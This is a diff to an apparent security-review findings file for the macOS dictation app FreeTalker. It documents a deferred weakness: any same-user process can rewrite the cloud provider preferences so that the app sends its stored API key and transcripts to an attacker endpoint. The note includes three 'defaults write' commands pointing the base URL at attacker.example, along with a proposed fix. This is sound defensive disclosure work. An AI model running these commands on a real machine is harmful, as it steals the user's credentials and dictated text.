@@ -1,5 +1,52 @@
 # Deferred Findings (Codex adversarial review)
 
+## Automation Surface (round 1) — pre-existing provider-preference rewrite exposed by Finding 1
+
+### Any same-user process can rewrite FreeTalker's cloud provider preferences and harvest the API key on the user's next ordinary dictation, no automation involved
+
+**Where:** `Sources/FreeTalker/Settings/AppSettings.swift` (`llmProvider`, `cloudLLMBaseURL`,
+`cloudLLMModel` — all plain `UserDefaults`-backed `@Published` properties, no per-writer
+authentication), read by `AppCoordinator.resolveActiveProcessor()`/`isCloudLLMConfigured` and
+paired with the matching Keychain entry (`Keychain.Account.cloudLLMKey(for:)`) whenever cloud
+post-processing runs for an ordinary Dictation.
+
+**Why real, and why deferred:** Codex round-1 Finding 1 (CRITICAL) originally described a
+confused-deputy exfiltration route THROUGH automation: a same-user process could flip
+`automationEnabled` on via `defaults write`, repoint the provider/base-URL/model preferences at an
+attacker-controlled endpoint, relaunch FreeTalker, and call `clean up` to have FreeTalker read the
+protected Keychain key and send it to that endpoint. This branch closes that specific route by
+making `clean up` always run on-device (`AutomationService.cleanUpText` now calls
+`AppleFMProcessor` unconditionally, never `AppCoordinator.resolveActiveProcessor()`'s cloud
+selection) — see `Sources/FreeTalker/Automation/AutomationService.swift`.
+
+That fix does not touch the underlying weakness Finding 1 exposed: `llmProvider`,
+`cloudLLMBaseURL`, and `cloudLLMModel` are ordinary `UserDefaults` values with no authentication of
+the writer. ANY process running as the same macOS user — automation enabled or not, FreeTalker
+running or not — can already do:
+
+```sh
+defaults write org.freetalker.app llmProvider -string "openAI"
+defaults write org.freetalker.app cloudLLMBaseURL -string "https://attacker.example/v1"
+defaults write org.freetalker.app cloudLLMModel -string "whatever"
+```
+
+The next time the user dictates normally (no automation, no Shortcut, just talking) with cloud
+post-processing configured, FreeTalker reads the real Keychain API key, pairs it with the
+now-attacker-controlled base URL, and sends the transcript (and the key, via the provider's own
+Authorization header) to that endpoint. This is a pre-existing gap in how FreeTalker trusts its own
+preference store, not something the automation surface introduced — it was simply the route this
+PR's adversarial review used to reach it. Fixing `UserDefaults`/Keychain trust boundaries is a
+larger change (would need something like a signed/fingerprinted preference bundle, or moving
+provider identity into the Keychain item itself so a mismatched base URL is detectable) than this
+PR's scope, and is orthogonal to "does automation add a new way to reach the key" — it does not,
+after this branch's fix.
+
+**Suggested fix (follow-up PR):** Bind the Keychain-stored key to the specific
+provider/base-URL/model triple it was saved for (e.g. store a hash of the triple alongside the key,
+or key the Keychain account string on all three rather than just the provider), so a preference
+rewrite that doesn't also produce a matching Keychain write is detected and refused rather than
+silently paired with the real key.
+
 ## Correction Loop — F16
 
 ### F16 — LOW — `kAXDocumentAttribute` can't distinguish two tabs sharing a URL, so the correction-fallback document check fails closed in browsers instead of succeeding
